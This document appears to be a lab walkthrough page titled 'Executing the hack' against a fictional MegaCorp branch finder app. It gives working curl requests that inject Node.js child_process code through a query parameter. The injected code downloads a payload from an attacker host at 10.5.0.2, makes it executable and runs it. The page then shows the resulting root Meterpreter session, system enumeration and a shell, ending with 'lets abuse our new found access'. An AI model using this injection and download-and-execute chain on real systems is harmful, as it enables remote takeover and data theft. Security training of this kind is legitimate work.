---
id: execute_hack
title: Executing the hack
sidebar_label: Execution
---

## The vulnerability

One of the applications of MegaCorp, the branch finder application, has a vulnerability in a library that it uses to render the results.

... more details on the vuln.

## Executing the payload

The first step is to get the payload on the target machine.

```shell
┌──(root💀kali)-[/]
└─$ curl "search-http.ingress.shipyard.run:9090?device[]=x&device[]=y%27-require(%27child_process%27).exec(%27curl+10.5.0.2:8000/payload+-o+payload%27)-%27"

<div>String: x,y'-require('child_process').exec('curl 10.5.0.2:8000/payload -o payload')-'</div><div> Mobile version </div>
```

In order to run our payload, we have to make it executable.

```shell
┌──(root💀kali)-[/]
└─$ curl "search-http.ingress.shipyard.run:9090?device[]=x&device[]=y%27-require(%27child_process%27).exec(%27chmod+777+payload%27)-%27"

<div>String: x,y'-require('child_process').exec('chmod 777 payload')-'</div><div> Mobile version </div>
```

Now we can execute the payload.

```shell
┌──(root💀kali)-[/]
└─$ curl "search-http.ingress.shipyard.run:9090?device[]=x&device[]=y%27-require(%27child_process%27).exec(%27./payload%27)-%27"

<div>String: x,y'-require('child_process').exec('./payload')-'</div><div> Mobile version </div>
```

As soon as the payload gets executed, we see a session show up and a meterpreter session is automatically opened on the target host.

```shell
[*] http://0.0.0.0:9999 handling request from 10.5.0.4; (UUID: w26bw3o1) Redirecting stageless connection from /h7sUeWnwyAwFZgNnWs3kzgCzN70KnX64Dz_mC1nzQlzyq-Uk9uMBpMDwp9GU6yZ9 with UA 'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko'
[*] http://0.0.0.0:9999 handling request from 10.5.0.4; (UUID: w26bw3o1) Attaching orphaned/stageless session...
[*] Meterpreter session 1 opened (10.5.0.2:9999 -> 10.5.0.4:43191) at 2020-11-11 13:05:45 +0000

meterpreter >
```

## Examine the remote host

Now that we have access to the remote host, lets see what kind of information we can get.
First lets take a look at where we landed on the host.

```shell
meterpreter > pwd

/usr/src/app
```

And as which user we have opened a session.

```shell
meterpreter > getuid

Server username: root @ search-586495dcd8-rqjk9 (uid=0, gid=0, euid=0, egid=0)
```

We can take a look at all the running processes.

```shell
meterpreter > ps

Process List
============

 PID   PPID  Name     Arch    User  Path
 ---   ----  ----     ----    ----  ----
 1     0     npm      x86_64  root  /usr/local/bin
 17    1     sh       x86_64  root  /bin
 18    17    node     x86_64  root  /usr/local/bin
 28    0     bash     x86_64  root  /bin
 1158  18    sh       x86_64  root  /bin
 1159  1158  payload  x86     root  /usr/src/app
```

And even gather additional information by executing post modules.

```shell
meterpreter > run post/linux/gather/enum_system

[+] Info:
[+]     Debian GNU/Linux 9
[+]     Linux search-586495dcd8-rqjk9 4.19.104-microsoft-standard #1 SMP Wed Feb 19 06:37:35 UTC 2020 x86_64 GNU/Linux
[+]     Module running as "root" user
[*] Linux version stored in /root/.msf4/loot/20201111131258_default_1_linux.enum.syste_215236.txt
[*] User accounts stored in /root/.msf4/loot/20201111131258_default_1_linux.enum.syste_085161.txt
[*] Installed Packages stored in /root/.msf4/loot/20201111131258_default_1_linux.enum.syste_996275.txt
[*] Running Services stored in /root/.msf4/loot/20201111131258_default_1_linux.enum.syste_708083.txt
[*] Cron jobs stored in /root/.msf4/loot/20201111131258_default_1_linux.enum.syste_579733.txt
[*] Disk info stored in /root/.msf4/loot/20201111131258_default_1_linux.enum.syste_231217.txt
[*] Logfiles stored in /root/.msf4/loot/20201111131258_default_1_linux.enum.syste_252829.txt
[*] Setuid/setgid files stored in /root/.msf4/loot/20201111131258_default_1_linux.enum.syste_496087.txt
[*] CPU Vulnerabilities stored in /root/.msf4/loot/20201111131300_default_1_linux.enum.syste_470958.txt
```

## Get a shell on the remote host

But what we really want is a shell on the remote host.

```shell
meterpreter > shell

Process 1165 created.
Channel 1 created.
```

Eventhough we do not see a command prompt, we do still have a full shell available to us.
Lets test this by listing the files in the current directory.

```shell
ls -lha

total 1.2M
drwxr-xr-x  1 root root 4.0K Nov 11 12:54 .
drwxr-xr-x  1 root root 4.0K Mar 15  2019 ..
drwxr-xr-x  2 root root 4.0K Mar 15  2019 .circleci
drwxr-xr-x  8 root root 4.0K Mar 15  2019 .git
-rw-r--r--  1 root root   82 Mar 15  2019 Dockerfile
-rw-r--r--  1 root root 3.3K Mar 15  2019 README.md
-rw-r--r--  1 root root  639 Mar 15  2019 app.js
drwxr-xr-x 53 root root 4.0K Mar 15  2019 node_modules
-rw-r--r--  1 root root  165 Mar 15  2019 package.json
-rwxrwxrwx  1 root root 1.1M Nov 11 13:05 payload
drwxr-xr-x  2 root root 4.0K Mar 15  2019 templates
-rw-r--r--  1 root root  14K Mar 15  2019 yarn.lock
```

Now lets abuse our new found access.
